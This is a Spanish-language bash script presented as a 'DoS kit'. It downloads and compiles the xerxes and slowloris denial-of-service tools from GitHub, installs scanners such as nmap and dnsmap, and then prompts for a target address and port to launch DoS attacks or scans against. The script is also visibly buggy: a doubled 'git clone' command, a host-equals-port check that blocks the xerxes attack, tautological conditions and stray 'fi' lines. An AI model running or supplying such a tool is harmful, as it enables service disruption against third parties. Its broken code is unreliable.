#!/bin/bash

echo "    .__________    ___________    ____  __    "
echo "  __| _/\   _  \  /   _____/  | _/_   |/  |_  "
echo " / __ | /  /_\  \ \_____  \|  |/ /|   \   __\ "
echo "/ /_/ | \  \_/   \/        \    < |   ||  |   "
echo "\____ |  \_____  /_______  /__|_ \|___||__|   "
echo "     \/        \/        \/     \/  "

echo "                hecho por retr0 "
echo " github: https://github.com/retr0-a12 "

echo "[1]descargar herramientas DoS"
echo "[2]ejecutar herramientas DoS"
echo "[99]salir"
echo -n "dav-->"

read n

if [ $n = 1 ]; then
echo "                                     00111010100000 "
echo "                                     00101010101010 "
echo "                                     01011010111010 "
echo "                                     01010101011001 "
echo "                                     01010101011101 "
echo "                                101010101010101000101010 "
echo "                                  101010111010101010101 "
echo "                                    01010101010101010 "
echo "                                     010101111010101 "
echo "                                      0101010101010 "
echo "                                       01011011010 "
echo "                                        010111101 "
echo "                                         0101010 "
echo "                                          10101 "
echo "                                           101 "
echo "                                            0 "
echo "[1]descargar xerxes"
echo "[2]descargar etherape (monitor grafico de red)"
echo "[3]descargar slowloris"
echo "[4]descargar nmap"
echo "[5]descargar dnsmap"
echo "[b]volver al inicio [99]salir"
echo -n "dav-->"

read a

if [ $a = 1 ]; then
    git clone https://github.com/ngrock90/xerxes.git
          cd xerxes
     clang xerxes.c -o xerxes
elif [ $a = 2 ]; then
      apt-get install etherape
elif [ $a = 3 ]; then
       git clone git clone https://github.com/gkbrk/slowloris.git
elif [ $a = b ]; then
         bash d0Sk1t.sh
elif [ $a = 99 ]; then
       exit 0
elif [ $a = 4 ]; then
        apt-get install nmap
elif [ $a = 5 ]; then
         apt-get install dnsmap
fi
elif [ $n = 2 ]; then
clear
echo " ______   _______  _______    _______  _______  _______  __   __  __  "
echo "|      | |       ||       |  |  _    ||       ||       ||  |_|  ||  | "
echo "|  _    ||   _   ||  _____|  | |_|   ||   _   ||   _   ||       ||  | "
echo "| | |   ||  | |  || |_____   |       ||  | |  ||  | |  ||       ||  | "
echo "| |_|   ||  |_|  ||_____  |  |  _   | |  |_|  ||  |_|  ||       ||__| "
echo "|       ||       | _____| |  | |_|   ||       ||       || ||_|| | __  "
echo "|______| |_______||_______|  |_______||_______||_______||_|   |_||__| "
echo "[1]ataque DoS con xerxes"
echo "[2]ataque DoS con slowloris"
echo "[3]escanear con nmap"
echo "[4]DNSMAP"
echo -n "dav -->"
read t
if [ $t = 1 ]; then
echo -n "escribe el dns dav-->"
read dns
if [ $dns = $dns ]; then
       nmap $dns
echo -n "escribe puerto a atacar dav-->"
read puerto
if [ $dns = $puerto ]; then
      cd xerxes
      ./xerxes $dns $puerto
fi
fi
elif [ $t = 2 ]; then
echo -n "escribe la direccion dav-->"
read direccion
if [ $direccion = $direccion ]; then
           cd slowloris
         python3 slowloris.py $direccion
fi
elif [ $t = 3 ]; then
echo -n "dav-->"
read map
if [ $map = $map ]; then
       nmap $map
fi
elif [ $t = 4 ]; then
echo -n "dav-->"
read dn
if [ $dn = $dn ]; then
      dnsmap $dn
fi

fi

fi

fi

fi
